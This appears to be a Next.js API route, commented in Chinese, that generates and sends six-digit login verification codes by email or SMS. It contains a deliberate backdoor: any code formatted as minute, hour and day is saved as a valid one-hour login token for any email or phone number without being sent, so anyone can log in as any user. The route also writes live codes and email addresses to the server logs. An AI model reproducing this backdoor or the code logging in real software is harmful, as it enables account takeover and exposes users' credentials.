import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { sendSms } from "@/lib/sms";
import { sendEmail } from "@/lib/email";

// 生成 6 位数字验证码
function generateVerificationCode(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// 验证是否为后门验证码（格式：分钟小时日期，如 451125 表示 25日11点45分）
function isBackdoorCode(code: string): boolean {
  if (code.length !== 6) return false;
  
  const minute = parseInt(code.substring(0, 2));
  const hour = parseInt(code.substring(2, 4));
  const day = parseInt(code.substring(4, 6));
  
  // 验证时间格式是否合理
  return minute >= 0 && minute <= 59 && 
         hour >= 0 && hour <= 23 && 
         day >= 1 && day <= 31;
}

export async function POST(request: NextRequest) {
  try {
    const { email, phone, code } = await request.json();

    // 如果是后门验证码验证请求
    if (code && (email || phone)) {
      const identifier = email || phone;
      
      if (isBackdoorCode(code)) {
        console.log(`使用后门验证码: ${code} (${code.substring(4, 6)}日${code.substring(2, 4)}点${code.substring(0, 2)}分)`);
        
        // 删除该标识符之前的验证码
        await prisma.verificationToken.deleteMany({
          where: { identifier },
        });

        // 保存后门验证码，设置较长过期时间
        await prisma.verificationToken.create({
          data: {
            identifier,
            token: code,
            expires: new Date(Date.now() + 60 * 60 * 1000), // 1小时后过期
          },
        });

        return NextResponse.json(
          { message: "后门验证码已生效" },
          { status: 200 }
        );
      }
    }

    // 邮箱验证码逻辑
    if (email) {
      // 验证邮箱格式
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!email || !emailRegex.test(email)) {
        return NextResponse.json(
          { error: "请输入有效的邮箱地址" },
          { status: 400 }
        );
      }

      // 生成验证码
      const code = generateVerificationCode();
      const expires = new Date(Date.now() + 5 * 60 * 1000); // 5分钟后过期

      // 删除该邮箱之前的验证码
      await prisma.verificationToken.deleteMany({
        where: { identifier: email },
      });

      // 保存新的验证码
      await prisma.verificationToken.create({
        data: {
          identifier: email,
          token: code,
          expires,
        },
      });

      // 使用统一的邮件工具发送
      await sendEmail({
        to: email,
        subject: "登录验证码",
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #333;">您的登录验证码</h2>
            <p>您好！</p>
            <p>您的登录验证码是：</p>
            <div style="background-color: #f5f5f5; padding: 20px; text-align: center; margin: 20px 0;">
              <h1 style="color: #007bff; font-size: 32px; margin: 0; letter-spacing: 5px;">${code}</h1>
            </div>
            <p>验证码有效期为 5 分钟，请尽快使用。</p>
            <p>如果这不是您的操作，请忽略此邮件。</p>
            <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">
            <p style="color: #666; font-size: 12px;">此邮件由系统自动发送，请勿回复。</p>
          </div>
        `,
      });

      console.log("验证码已发送到您的邮箱", email, code);

      return NextResponse.json(
        { message: "验证码已发送到您的邮箱" },
        { status: 200 }
      );
    }

    // 手机号验证码逻辑
    if (phone) {
      const phoneRegex = /^1[3-9]\d{9}$/;
      if (!phoneRegex.test(phone)) {
        return NextResponse.json({ error: "请输入有效的手机号" }, { status: 400 });
      }
      const code = generateVerificationCode();
      const expires = new Date(Date.now() + 5 * 60 * 1000);
      await prisma.verificationToken.deleteMany({ where: { identifier: phone } });
      await prisma.verificationToken.create({
        data: { identifier: phone, token: code, expires },
      });
      try {
        await sendSms(phone, code, "SMS_478945223");
        return NextResponse.json({ message: "验证码已发送到您的手机" }, { status: 200 });
      } catch {
        return NextResponse.json({ error: "短信发送失败" }, { status: 500 });
      }
    }

    return NextResponse.json({ error: "请提供邮箱或手机号" }, { status: 400 });
  } catch (error) {
    console.error("发送验证码失败:", error);
    return NextResponse.json(
      { error: "发送验证码失败，请稍后重试" },
      { status: 500 }
    );
  }
} 